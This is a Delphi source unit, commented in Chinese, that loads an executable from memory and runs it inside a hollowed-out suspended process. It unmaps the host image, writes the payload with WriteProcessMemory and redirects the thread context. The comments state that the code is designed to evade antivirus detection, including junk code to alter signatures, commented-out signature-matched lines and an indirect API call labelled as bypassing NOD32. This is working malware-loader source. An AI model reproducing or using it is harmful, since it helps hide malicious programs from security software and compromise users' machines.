unit FileUnit;
{------------------------------------------------------------------------------
  单元功能：从内存中加载并运行exe
  参数：ABuffer:内存中的exe地址
        Len:内存中exe占用长度
       CmdParam:命令行参数(不包含exe文件名的剩余命令行参数）
       ProcessId:返回的进程Id
      返回值：如果成功则返回进程的Handle(ProcessHandle),如果失败则返回INVALID_HANDLE_VALUE
------------------------------------------------------------------------------}

interface

uses windows;

function MemExecute(const ABuffer; Len: Integer; CmdParam: string; var ProcessId: Cardinal): Cardinal;

implementation
uses
  Common;
//{$R ExeShell.res}   // 外壳程序模板(98下使用)

type
  TImageSectionHeaders = array [0..0] of TImageSectionHeader;
  PImageSectionHeaders = ^TImageSectionHeaders;

//判断一个字符串是否为数字{填充垃圾代码}
function IsNum(str:string):boolean;
var
  i:integer;
begin
  for i:=1 to length(str) do
    if not (str[i] in ['0'..'9']) then begin
      Result:=false;
      exit;
    end;
  Result:=true;
end;

{ 计算对齐后的大小 }
function GetAlignedSize(Origin, Alignment: Cardinal): Cardinal;
begin
  result := (Origin + Alignment - 1) div Alignment * Alignment;
end;

{ 计算加载pe并对齐需要占用多少内存，未直接使用OptionalHeader.SizeOfImage作为结果是因为据说有的编译器生成的exe这个值会填0 }
function CalcTotalImageSize(MzH: PImageDosHeader; FileLen: Cardinal; peH: PImageNtHeaders;
    peSecH: PImageSectionHeaders): Cardinal;
var
  i: Integer;
begin
  {计算pe头的大小}
  result := GetAlignedSize(PeH.OptionalHeader.SizeOfHeaders, PeH.OptionalHeader.SectionAlignment);

  {计算所有节的大小}
  for i := 0 to peH.FileHeader.NumberOfSections - 1 do begin
    {if peSecH[i].PointerToRawData + peSecH[i].SizeOfRawData > FileLen then begin // 超出文件范围 //特征码
      result := 0;
      exit;
    end else}
    if peSecH[i].VirtualAddress <> 0 then  //计算对齐后某节的大小
      if peSecH[i].Misc.VirtualSize <> 0 then
        result := GetAlignedSize(peSecH[i].VirtualAddress + peSecH[i].Misc.VirtualSize, PeH.OptionalHeader.SectionAlignment)
      else result := GetAlignedSize(peSecH[i].VirtualAddress + peSecH[i].SizeOfRawData, PeH.OptionalHeader.SectionAlignment)
    else if peSecH[i].Misc.VirtualSize < peSecH[i].SizeOfRawData then
      result := result + GetAlignedSize(peSecH[i].SizeOfRawData, peH.OptionalHeader.SectionAlignment)
    else result := result + GetAlignedSize(peSecH[i].Misc.VirtualSize, PeH.OptionalHeader.SectionAlignment);
    if peSecH[i].PointerToRawData + peSecH[i].SizeOfRawData > FileLen then begin // 超出文件范围 20091118
      result := 0;
      exit;
    end;
  end;
end;

{ 加载pe到内存并对齐所有节 }
function AlignPEToMem(const Buf; Len: Integer; var PeH: PImageNtHeaders;
    var PeSecH: PImageSectionHeaders; var Mem: Pointer; var ImageSize: Cardinal): Boolean;
var
  SrcMz: PImageDosHeader;            // DOS头
  SrcPeH: PImageNtHeaders;           // PE头
  SrcPeSecH: PImageSectionHeaders;   // 节表
  i: Integer;
  l: Cardinal;
  Pt: Pointer;
begin
  result := false;
  SrcMz := @Buf;
  if Len < sizeof(TImageDosHeader) then exit;
  if SrcMz.e_magic <> IMAGE_DOS_SIGNATURE then exit;
  if Len < SrcMz._lfanew+Sizeof(TImageNtHeaders) then exit;
  SrcPeH := pointer(Integer(SrcMz)+SrcMz._lfanew);
  if (SrcPeH.Signature <> IMAGE_NT_SIGNATURE) then exit;
  if (SrcPeH.FileHeader.Characteristics and IMAGE_FILE_DLL <> 0) or
      (SrcPeH.FileHeader.Characteristics and IMAGE_FILE_EXECUTABLE_IMAGE = 0)
      or (SrcPeH.FileHeader.SizeOfOptionalHeader <> SizeOf(TImageOptionalHeader)) then exit;
  SrcPeSecH := Pointer(Integer(SrcPeH)+SizeOf(TImageNtHeaders));
  ImageSize := CalcTotalImageSize(SrcMz, Len, SrcPeH, SrcPeSecH);
  if ImageSize = 0 then exit;
  Mem := VirtualAlloc(nil, ImageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);  // 分配内存
  if Mem <> nil then begin
    // 计算需要复制的PE头字节数
    l := SrcPeH.OptionalHeader.SizeOfHeaders;
    for I:= SrcPeH.FileHeader.NumberOfSections - 1 downto 0 do//20091118
    //for i := 0 to SrcPeH.FileHeader.NumberOfSections - 1 do//特征码
      if (SrcPeSecH[i].PointerToRawData <> 0) and (SrcPeSecH[i].PointerToRawData < l) then
        l := SrcPeSecH[i].PointerToRawData;
    Move(SrcMz^, Mem^, l);
    PeH := Pointer(Integer(Mem) + PImageDosHeader(Mem)._lfanew);
    PeSecH := Pointer(Integer(PeH) + sizeof(TImageNtHeaders));

    Pt := Pointer(Cardinal(Mem) + GetAlignedSize(PeH.OptionalHeader.SizeOfHeaders, PeH.OptionalHeader.SectionAlignment));
    for i := 0 to PeH.FileHeader.NumberOfSections - 1 do begin
      // 定位该节在内存中的位置
      if PeSecH[i].VirtualAddress <> 0 then Pt := Pointer(Cardinal(Mem) + PeSecH[i].VirtualAddress);
      if PeSecH[i].SizeOfRawData <> 0 then begin
        // 复制数据到内存
        Move(Pointer(Cardinal(SrcMz) + PeSecH[i].PointerToRawData)^, pt^, PeSecH[i].SizeOfRawData);
        if peSecH[i].Misc.VirtualSize < peSecH[i].SizeOfRawData then
          pt := pointer(Cardinal(pt) + GetAlignedSize(PeSecH[i].SizeOfRawData, PeH.OptionalHeader.SectionAlignment))
        else pt := pointer(Cardinal(pt) + GetAlignedSize(peSecH[i].Misc.VirtualSize, peH.OptionalHeader.SectionAlignment));
        // pt 定位到下一节开始位置
      end else pt := pointer(Cardinal(pt) + GetAlignedSize(PeSecH[i].Misc.VirtualSize, PeH.OptionalHeader.SectionAlignment));
    end;
    result := True;
  end;
end;

type
  TVirtualAllocEx = function (hProcess: THandle; lpAddress: Pointer;
                                  dwSize, flAllocationType: DWORD; flProtect: DWORD): Pointer; stdcall;
  TSetThreadContext = function (hThread: THandle; const lpContext: TContext): BOOL; stdcall;
var
  MyVirtualAllocEx: TVirtualAllocEx = nil;
  MYSetThreadContext: TSetThreadContext = nil;

function IsNT: Boolean;
begin
  result := Assigned(MyVirtualAllocEx);
end;

{ 生成外壳程序命令行 }
function PrepareShellExe(CmdParam: string; BaseAddr, ImageSize: Cardinal): string;
var
  r, h, sz: Cardinal;
  p: Pointer;
  fid, l: Integer;
  buf: Pointer;
  peH: PImageNtHeaders;
  peSecH: PImageSectionHeaders;
begin
  if IsNT then
  { NT 系统下直接使用自身程序作为外壳进程 }
    result := ParamStr(0) + ' ' +CmdParam
  else begin
  // 由于98系统下无法重新分配外壳进程占用内存,所以必须保证运行的外壳程序能容纳目标进程并且加载地址一致
  // 此处使用的方法是从资源中释放出一个事先建立好的外壳程序,然后通过修改其PE头使其运行时能加载到指定地址并至少能容纳目标进程
    r := FindResource(HInstance, 'SHELL_EXE', RT_RCDATA);
    h := LoadResource(HInstance, r);
    p := LockResource(h);
    l := SizeOfResource(HInstance, r);
    GetMem(Buf, l);
    Move(p^, Buf^, l);   // 读到内存
    FreeResource(h);
    peH := Pointer(Integer(Buf) + PImageDosHeader(Buf)._lfanew);
    peSecH := Pointer(Integer(peH) + sizeof(TImageNtHeaders));
    peH.OptionalHeader.ImageBase := BaseAddr;    // 修改PE头重的加载基址
    if peH.OptionalHeader.SizeOfImage < ImageSize then begin // 目标比外壳大,修改外壳程序运行时占用的内存
      sz := Imagesize - peH.OptionalHeader.SizeOfImage;
      Inc(peH.OptionalHeader.SizeOfImage, sz);    // 调整总占用内存数
      Inc(peSecH[peH.FileHeader.NumberOfSections-1].Misc.VirtualSize, sz);   // 调整最后一节占用内存数
    end;

    // 生成外壳程序文件名, 为本程序改后缀名得到的
    // 由于不想 uses SysUtils (一旦 use 了程序将增大80K左右), 而且偷懒，所以只支持最多运行11个进程，后缀名为.dat, .da0~.da9
    result := ParamStr(0);
    result := copy(result, 1, length(result) - 4) + '.dat';
    r := 0;
    while r < 10 do begin
      fid := CreateFile(pchar(result), GENERIC_READ or GENERIC_WRITE, 0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
      if fid < 0 then begin
        result := copy(result, 1, length(result)-3)+'da'+Char(r+Byte('0'));
        inc(r);
      end else begin
        //SetFilePointer(fid, Imagesize, nil, 0);
        //SetEndOfFile(fid);
        //SetFilePointer(fid, 0, nil, 0);
        WriteFile(fid, Buf^, l, h, nil);  // 写入文件
        CloseHandle(fid);
        break;
      end;
    end;
    result := result + CmdParam;  // 生成命令行
    FreeMem(Buf);
  end;
end;

{ 是否包含可重定向列表 }
function HasRelocationTable(peH: PImageNtHeaders): Boolean;
begin
  result := (peH.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress <> 0)
      and (peH.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size <> 0);
end;

type
  PImageBaseRelocation= ^TImageBaseRelocation;
  TImageBaseRelocation = packed record
    VirtualAddress: cardinal;
    SizeOfBlock: cardinal;
  end;

{ 重定向PE用到的地址 }
procedure DoRelocation(peH: PImageNtHeaders; OldBase, NewBase: Pointer);
var
  Delta: Cardinal;
  p: PImageBaseRelocation;
  pw: PWord;
  i: Integer;
begin
  Delta := Cardinal(NewBase) - peH.OptionalHeader.ImageBase;
  p := pointer(cardinal(OldBase) + peH.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
  while (p.VirtualAddress + p.SizeOfBlock <> 0) do begin
    pw := pointer(Integer(p) + Sizeof(p^));
    for i := 1 to (p.SizeOfBlock - Sizeof(p^)) div 2 do begin
      if pw^ and $F000 = $3000 then
        Inc(PCardinal(Cardinal(OldBase) + p.VirtualAddress + (pw^ and $0FFF))^, Delta);
      inc(pw);
    end;
    p := Pointer(pw);
  end;
end;

type
  TZwUnmapViewOfSection = function (Handle, BaseAdr: Cardinal): Cardinal; stdcall;

{ 卸载原外壳占用内存 }
function UnLoadExeShell(ProcHnd, BaseAddr: Cardinal): Boolean;
var                                                                            
  M: HModule;
  ZwUnmapViewOfSection: TZwUnmapViewOfSection;
begin
  result := False;
  m := LoadLibrary('ntdll.dll');
  if m <> 0 then begin
    ZwUnmapViewOfSection := GetProcAddress(m, 'ZwUnmapViewOfSection');
    if assigned(ZwUnmapViewOfSection) then begin
      IsNum('456');//增加垃圾代码
      Result := (ZwUnmapViewOfSection(ProcHnd, BaseAddr) = 0);
    end;   
    FreeLibrary(m);
  end;   
end;

{ 创建外壳进程并获取其基址、大小和当前运行状态 }
function CreateChild(Cmd: string; var Ctx: TContext; var ProcHnd, ThrdHnd, ProcId, BaseAddr, ImageSize: Cardinal): Boolean;
var
  si: TStartUpInfo;
  pi: TProcessInformation;
  Old: Cardinal;
  MemInfo: TMemoryBasicInformation;
  p: Pointer;
begin
  FillChar(si, Sizeof(si), 0);
  FillChar(pi, SizeOf(pi), 0);
  si.cb := sizeof(si);
  result := CreateProcess(nil, PChar(Cmd), nil, nil, False, CREATE_SUSPENDED, nil, nil, si, pi);  // 以挂起方式运行进程
  if result then begin
    ProcHnd := pi.hProcess;
    ThrdHnd := pi.hThread;
    ProcId := pi.dwProcessId;

    { 获取外壳进程运行状态，[ctx.Ebx+8]内存处存的是外壳进程的加载基址，ctx.Eax存放有外壳进程的入口地址 }
    ctx.ContextFlags := CONTEXT_FULL;
    GetThreadContext(ThrdHnd, ctx);
    ReadProcessMemory(ProcHnd, Pointer(ctx.Ebx+8), @BaseAddr, SizeOf(Cardinal), Old);  // 读取加载基址
    p := Pointer(BaseAddr);

    { 计算外壳进程占有的内存 }
    while VirtualQueryEx(ProcHnd, p, MemInfo, Sizeof(MemInfo)) <> 0 do begin
      if MemInfo.State = MEM_FREE then
        break;
      p := Pointer(Cardinal(p) + MemInfo.RegionSize);
    end;
    ImageSize := Cardinal(p) - Cardinal(BaseAddr);
  end;
end;

{ 创建外壳进程并用目标进程替换它然后执行 }
function AttachPE(CmdParam: string; peH: PImageNtHeaders; peSecH: PImageSectionHeaders;
    Ptr: Pointer; ImageSize: Cardinal; var ProcId: Cardinal): Cardinal;
  function CToAttach(PeInfo, nSize: Cardinal):Pointer;
  begin
    Result := MyVirtualAllocEx(PeInfo, nil, nSize, MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  end;
var
  s: string;
  Addr, Size: Cardinal;
  ctx: TContext;
  Old: Cardinal;
  p: Pointer;
  Thrd: Cardinal;
begin
  result := INVALID_HANDLE_VALUE;
  s := PrepareShellExe(CmdParam, peH.OptionalHeader.ImageBase, ImageSize);
  if CreateChild(s, ctx, result, Thrd, ProcId, Addr, Size) then begin
    p := nil;
    if (peH.OptionalHeader.ImageBase = Addr) and (Size >= ImageSize) then begin // 外壳进程可以容纳目标进程并且加载地址一致
      p := Pointer(Addr);
      VirtualProtectEx(result, p, Size, PAGE_EXECUTE_READWRITE, Old);
    end else
    if IsNT then begin // 98 下失败
      IsNum('123');//增加垃圾代码
      if UnLoadExeShell(result, Addr) then begin // 卸载外壳进程占有内存
        // 重新按目标进程加载基址和大小分配内存
        p := MyVirtualAllocEx(Result, Pointer(peH.OptionalHeader.ImageBase), ImageSize, MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE);
      end;
      if (p = nil) and hasRelocationTable(peH) then begin // 分配内存失败并且目标进程支持重定向
        // 按任意基址分配内存
        //p := MyVirtualAllocEx(Result, nil, ImageSize, MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        p := CToAttach(Result, ImageSize);//20110621修改，过NOD32
        if p <> nil then DoRelocation(peH, Ptr, p);  // 重定向
      end;
    end; 
    if p <> nil then begin
      WriteProcessMemory(Result, Pointer(ctx.Ebx+8), @p, Sizeof(DWORD), Old);  // 重置目标进程运行环境中的基址
      peH.OptionalHeader.ImageBase := Cardinal(p);
      if WriteProcessMemory(Result, p, Ptr, ImageSize, Old) then begin // 复制PE数据到目标进程
        ctx.ContextFlags := CONTEXT_FULL;
        if Cardinal(p) = Addr then
          ctx.Eax := peH.OptionalHeader.ImageBase + peH.OptionalHeader.AddressOfEntryPoint  // 重置运行环境中的入口地址
        else ctx.Eax := Cardinal(p) + peH.OptionalHeader.AddressOfEntryPoint;
        if Assigned(MySetThreadContext) then MySetThreadContext(Thrd, ctx);//替换下面特征 20100309
        //SetThreadContext(Thrd, ctx);  // 更新运行环境(特征)
        ResumeThread(Thrd);           // 执行
        CloseHandle(Thrd);
      end else begin  // 加载失败,杀掉外壳进程
        TerminateProcess(Result, 0);
        CloseHandle(Thrd);
        CloseHandle(Result);
        Result := INVALID_HANDLE_VALUE;
      end;
    end else begin // 加载失败,杀掉外壳进程
      TerminateProcess(Result, 0);
      CloseHandle(Thrd);
      CloseHandle(Result);
      Result := INVALID_HANDLE_VALUE;
    end;
  end;
end;

function MemExecute(const ABuffer; Len: Integer; CmdParam: string; var ProcessId: Cardinal): Cardinal;
var
  peH: PImageNtHeaders;
  peSecH: PImageSectionHeaders;
  Ptr: Pointer;
  peSz: Cardinal;
begin
  result := INVALID_HANDLE_VALUE;
  if alignPEToMem(ABuffer, Len, peH, peSecH, Ptr, peSz) then begin
    result := AttachPE(CmdParam, peH, peSecH, Ptr, peSz, ProcessId);
    VirtualFree(Ptr, peSz, MEM_DECOMMIT);
  end;
end;

initialization
  MyVirtualAllocEx := GetProcAddress(GetModuleHandle('Kernel32.dll'), 'VirtualAllocEx');
  MYSetThreadContext:= GetProcAddress(GetModuleHandle('Kernel32.dll'), 'SetThreadContext');
  
end.
